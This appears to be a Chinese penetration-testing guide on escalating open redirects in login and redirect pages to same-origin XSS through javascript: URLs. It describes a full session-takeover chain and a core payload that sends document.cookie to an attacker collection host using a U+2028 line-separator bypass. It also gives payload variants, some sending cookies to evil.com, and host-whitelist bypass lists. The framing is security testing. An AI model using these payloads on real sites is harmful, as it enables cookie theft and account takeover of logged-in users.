# 三、跳转型 XSS 专项（🔴 优先测试）

> 来源：CkSKILLS v1 `xss-frontend-security` §三、跳转型 XSS 专项（🔴 优先测试）（迁移至 v2 知识块）

### 3.0 为什么优先

中间跳转页 / 登录回跳信任任意 `target` 参数 → 开放重定向很常见，但多数测试者测到 http 跳转就停手。升级为 `javascript:` 伪协议执行 = **官方域同源 XSS**，可读 Cookie / 会话接管 / 钓鱼，危害翻数倍。

**攻击模型一句话**：官方中间页信任任意 target → 伪协议 + Unicode 行分隔符绕过 → 同源 JS 执行 → 读取非 HttpOnly 会话 Cookie → 外带至攻击者服务器 → 会话接管 → 读取订单/地址/个人数据。

**完整攻击链（ATT&CK 视角）**：
1. 构造恶意链接：`https://目标域/中间页?target=javascript://官方域/<U+2028>void(location='https://收票域/?c='+encodeURIComponent(document.cookie))//https://`
2. 诱导已登录用户点击（1-click）
3. 浏览器在目标官方域下执行 JS → 读取 `document.cookie`（含会话 Cookie 等凭证）
4. 整页导航到攻击者收票域 → Cookie 拼入 URL 外带
5. 攻击者在干净浏览器写入 Cookie → 直接访问业务接口 → 接管账号

### 3.1 入口排查（JS 审计第一步）

- 正则扫 JS bundle 的 location 赋值点：`location.href =`、`location.replace()`、`location.assign()`、`window.open()`、`location.hash`、`window.location =`
- 赋值右侧来源：`URLSearchParams(location.search).get(...)`、`getQueryString`、`decodeURIComponent(...)`、路由/状态参数
- 参数名黑名单：`target / redirect / redirect_uri / returnUrl / back / next / url / uri / link / goto / jump / to / callback / service / continue / forward`
- 高发位置：登录回跳、SSO 回调、分享邀请、支付回调、扫码登录、邮件/短信激活链接、**跨端中间页（Taro 的 taro-middle、uni-app 的 redirect 页）**——跨端逻辑常直接把参数透传给 location
- 前端框架注意：Vue/React router query、Taro.navigateTo/redirectTo、小程序参数透传

### 3.2 递进测试（看跳转能否升级到 JS 执行/数据外带，别停在开放重定向就收）

| 级别 | 测试 | 结果判定 |
|---|---|---|
| L1 | `target=http://evil.com` 整页跳转 | 开放重定向（低危，**不满足，继续测**） |
| L2 | `target=javascript:alert(1)` 或绕过变种（3.3）能执行 JS | **同源 XSS** → 打 Cookie/钓鱼/接管（高/严重） |
| L3 | 仅 http(s) 放行 → 检查跳转是否携带授权数据 | OAuth code/token 外带、绕过 SSRF URL 校验（中/高） |

### 3.3 Payload 库（javascript: 伪协议）

**核心形态**（注释形代码块 + Unicode 行分隔符）：
```
target=javascript://official.example/<U+2028>void(location='https://收票域/?c='+encodeURIComponent(document.cookie))//https://
```

**为什么能执行（解析器差异，绕过核心）**：
- **URL 解析器视角**：`javascript://official.example/...` 按 RFC 3986 解析，authority 是 `official.example`——若过滤器用 `new URL(payload).hostname` 做 Host 白名单校验，会**误判为合法官方域而放行**
- **JS 解析器视角**：浏览器执行 javascript: URL 时把内容当 JS 源码——`//official.example/` 是注释；**U+2028（%E2%80%A8，Unicode 行分隔符）是 JS 规范的行终止符**，终止注释行，下一行 `void(...)` 成为可执行代码；结尾 `//https://` 注释掉多余部分
- `void(...)` 返回 undefined，执行后页面不替换，行为隐蔽

**变种库**（L2 被拦时逐个试）：
```
javascript:/*注释*/alert(1)
javascript:&#x0a;alert(1)                    （HTML 实体编码换行）
jAvAsCrIpT:alert(1)                          （大小写混合）
java\0script:alert(1)
javascript:\talert(1)                        （Tab 干扰关键字正则）
javascript://注释<U+2029>alert(1)//          （U+2029 段落分隔符）
javascript:document['cookie']                （方括号取属性绕关键字）
javascript:window['location']='https://evil.com/?c='+document.cookie
javascript:String.fromCharCode(...)          （敏感词整体拼码）
```

**Host 白名单绕过**（过滤器按域名校验时，L2 之前先过一遍）：
```
https://trusted.com.evil.com              （后缀伪装）
https://evil.com/trusted.com              （路径伪装）
https://trusted.com@evil.com              （@ 认证段混淆）
https://evil.com#trusted.com              （# 截断）
https://evil.com?trusted.com              （? 截断）
https:///evil.com / http:https://evil.com （协议双写/混淆）
```

### 3.4 危害评估要点

- **Cookie HttpOnly 属性决定等级**：DevTools Application 面板查看，非 HttpOnly 的会话凭证（业务会话 Cookie/用户标识类）→ 高危；全 HttpOnly → 降级为钓鱼/CSRF 面
- **浏览器兼容性**：Chrome 允许 location 赋值执行 javascript: URL（可用）；Firefox 87+ 禁止 top-frame javascript: URL 导航（PoC 需标注浏览器与版本）
- **SSO/OAuth 回调场景**：跳转携带 code/token 时，仅 http(s) 开放重定向也可外带授权数据，单独成洞
- **跳转前的登录态校验**：中间跳转页若不校验登录态且可被强制导向钓鱼登录页，可判严重（大范围账号接管面）
- 同源 XSS 的额外价值：同源请求直接带 Cookie 打接口、渲染钓鱼页、写 localStorage 凭证、配合站内 JSONP
